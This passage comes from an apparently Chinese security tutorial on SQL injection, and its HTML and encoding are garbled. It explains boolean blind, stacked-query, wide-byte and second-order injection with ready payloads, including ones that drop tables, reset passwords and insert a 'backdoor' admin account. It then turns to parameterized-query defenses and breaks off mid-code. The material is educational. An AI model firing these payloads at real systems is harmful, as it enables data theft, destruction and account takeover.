&lt;h3 id=&#34;4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#4-å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based-Blind-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰&#34;&gt;&lt;/a&gt;4. å¸ƒå°”ç›²æ³¨ï¼ˆBoolean-based Blind Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šé€šè¿‡æ„é€ å¸ƒå°”è¡¨è¾¾å¼ï¼Œæ ¹æ®é¡µé¢è¿”å›å†…å®¹çš„å·®å¼‚æ¥æ¨æµ‹æ•°æ®åº“ä¿¡æ¯ã€‚å½“æ¡ä»¶ä¸ºçœŸæ—¶é¡µé¢æ­£å¸¸æ˜¾ç¤ºï¼Œæ¡ä»¶ä¸ºå‡æ—¶é¡µé¢å¼‚å¸¸æˆ–å†…å®¹å‘ç”Ÿå˜åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ ¸å¿ƒå‡½æ•°ä¸æŠ€å·§&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;substr(str, pos, len)&lt;/code&gt; - å­—ç¬¦ä¸²æˆªå–&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ascii(char)&lt;/code&gt; - å­—ç¬¦è½¬ASCIIç &lt;/li&gt;
&lt;li&gt;&lt;code&gt;length(str)&lt;/code&gt; - å­—ç¬¦ä¸²é•¿åº¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;like&lt;/code&gt; - æ¨¡ç³ŠåŒ¹é…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å®æˆ˜ç¤ºä¾‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# åˆ¤æ–­æ•°æ®åº“åé•¿åº¦&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; length(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;())=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;br&gt;# é€ä½çˆ†ç ´æ•°æ®åº“å&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--  # &amp;#x27;s&amp;#x27;&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--  # &amp;#x27;e&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;# ä½¿ç”¨&lt;span class=&#34;hljs-keyword&#34;&gt;like&lt;/span&gt;è¿›è¡Œæ¨¡ç³ŠåŒ¹é…&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;sec%&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#5-å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked-Query-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰&#34;&gt;&lt;/a&gt;5. å †å æŸ¥è¯¢æ³¨å…¥ï¼ˆStacked Query Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šå½“æ•°æ®åº“å’ŒWebåº”ç”¨æ”¯æŒåœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æ‰§è¡Œå¤šæ¡SQLè¯­å¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨åˆ†å·&lt;code&gt;;&lt;/code&gt;åˆ†éš”å¤šæ¡è¯­å¥ï¼Œå®ç°æ›´å¤æ‚çš„æ”»å‡»æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ”¯æŒæƒ…å†µ&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;: éœ€è¦ä½¿ç”¨&lt;code&gt;multi_query()&lt;/code&gt;å‡½æ•°ï¼Œé»˜è®¤ä¸æ”¯æŒ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SQL Server&lt;/strong&gt;: é»˜è®¤æ”¯æŒ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;: æ”¯æŒ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Oracle&lt;/strong&gt;: ä¸æ”¯æŒ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å±é™©æ“ä½œç¤ºä¾‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;into&lt;/span&gt; users(username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hacker&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; logs &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;update&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hacked&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt; hacker identified &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;é«˜çº§åˆ©ç”¨&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# åˆ›å»ºæ–°ç®¡ç†å‘˜è´¦æˆ·&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;into&lt;/span&gt; admin_users(username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;role&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;backdoor&amp;#x27;&lt;/span&gt;,md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;secret&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;br&gt;# ä¿®æ”¹ç°æœ‰ç”¨æˆ·æƒé™&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;update&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;role&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; username=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;normaluser&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#6-å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide-Byte-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰&#34;&gt;&lt;/a&gt;6. å®½å­—èŠ‚æ³¨å…¥ï¼ˆWide Byte Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šåˆ©ç”¨å¤šå­—èŠ‚å­—ç¬¦é›†ï¼ˆå¦‚GBKã€GB2312ï¼‰çš„ç¼–ç ç‰¹æ€§ï¼Œä½¿è½¬ä¹‰å­—ç¬¦&lt;code&gt;\&lt;/code&gt;ä¸æ³¨å…¥å­—ç¬¦ç»„åˆæˆåˆæ³•çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œä»è€Œç»•è¿‡è½¬ä¹‰é˜²æŠ¤æœºåˆ¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æŠ€æœ¯èƒŒæ™¯&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GBKç¼–ç ä¸­ï¼Œä¸€ä¸ªæ±‰å­—å ç”¨2ä¸ªå­—èŠ‚&lt;/li&gt;
&lt;li&gt;æŸäº›å­—èŠ‚ç»„åˆä¼šè¢«è§£é‡Šä¸ºå•ä¸ªæ±‰å­—å­—ç¬¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%df%5c&lt;/code&gt; åœ¨GBKç¼–ç ä¸‹ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªæ±‰å­—&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç»•è¿‡åŸç†&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# æ­£å¸¸æƒ…å†µï¼šå•å¼•å·è¢«è½¬ä¹‰&lt;/span&gt;&lt;br&gt;payload: admin&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;è½¬ä¹‰å: admin\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;hljs-attribute&#34;&gt;1&lt;/span&gt;=1 --&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# å®½å­—èŠ‚ç»•è¿‡ï¼š&lt;/span&gt;&lt;br&gt;payload: admin%df&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;è½¬ä¹‰å: admin%df\&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;hljs-attribute&#34;&gt;1&lt;/span&gt;=1 --&lt;br&gt;GBKè§£æ: admin[æ±‰å­—]&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; or 1=1 --&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å®æˆ˜payload&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?username=&lt;span class=&#34;hljs-keyword&#34;&gt;admin&lt;/span&gt;%df&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; union select 1,user(),3 --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;?id=1%df&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;())) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰&#34;&gt;&lt;a href=&#34;#7-äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order-Injectionï¼‰&#34; class=&#34;headerlink&#34; title=&#34;7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰&#34;&gt;&lt;/a&gt;7. äºŒæ¬¡æ³¨å…¥ï¼ˆSecond-order Injectionï¼‰&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;æ”»å‡»åŸç†&lt;/strong&gt;ï¼šæ¶æ„payloadåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­è¢«æ­£å¸¸å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä½†åœ¨åç»­çš„æŸ¥è¯¢ä¸­è¢«è°ƒç”¨æ—¶è§¦å‘SQLæ³¨å…¥ã€‚è¿™ç§æ”»å‡»æ–¹å¼å…·æœ‰å¾ˆå¼ºçš„éšè”½æ€§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ”»å‡»æµç¨‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ç¬¬ä¸€é˜¶æ®µ - æ•°æ®å­˜å‚¨&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# ç”¨æˆ·æ³¨å†Œæ—¶æäº¤æ¶æ„ç”¨æˆ·å&lt;/span&gt;&lt;br&gt;username: admin&amp;#x27;&lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ç¬¬äºŒé˜¶æ®µ - è§¦å‘æ³¨å…¥&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sql&#34;&gt;# ç®¡ç†åå°æŸ¥è¯¢è¯¥ç”¨æˆ·ä¿¡æ¯æ—¶&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;--&amp;#x27;&lt;/span&gt;&lt;br&gt;# æ³¨é‡Šç¬¦å¯¼è‡´åç»­æ¡ä»¶è¢«å¿½ç•¥&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å…¸å‹åº”ç”¨åœºæ™¯&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨æˆ·æ³¨å†Œ&amp;#x2F;ä¸ªäººä¿¡æ¯ä¿®æ”¹&lt;/li&gt;
&lt;li&gt;æ–‡ç« è¯„è®ºç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æ–‡ä»¶åå¤„ç†&lt;/li&gt;
&lt;li&gt;æ—¥å¿—è®°å½•ç³»ç»Ÿ&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ&#34;&gt;&lt;a href=&#34;#é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ&#34; class=&#34;headerlink&#34; title=&#34;é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ&#34;&gt;&lt;/a&gt;é˜²æŠ¤æªæ–½ä¸æœ€ä½³å®è·µ&lt;/h2&gt;&lt;h3 id=&#34;å¼€å‘å±‚é¢é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#å¼€å‘å±‚é¢é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;å¼€å‘å±‚é¢é˜²æŠ¤&#34;&gt;&lt;/a&gt;å¼€å‘å±‚é¢é˜²æŠ¤&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢&amp;#x2F;é¢„ç¼–è¯‘è¯­å¥&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt; é”™è¯¯å†™æ³•&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id = &amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt; æ­£ç¡®å†™æ³•  &lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$pdo&lt;/span&gt;-&amp;gt;prepare(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id = ?&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$stmt&lt;/span&gt;-&amp;gt;execute([&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;]]);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¸¥æ ¼çš„è¾“å…¥éªŒè¯&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç™½åå•éªŒè¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/^[0-9]+$/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Invalid input&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// é•¿åº¦é™åˆ¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;strlen&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;) &amp;#123;&lt;br&gt;    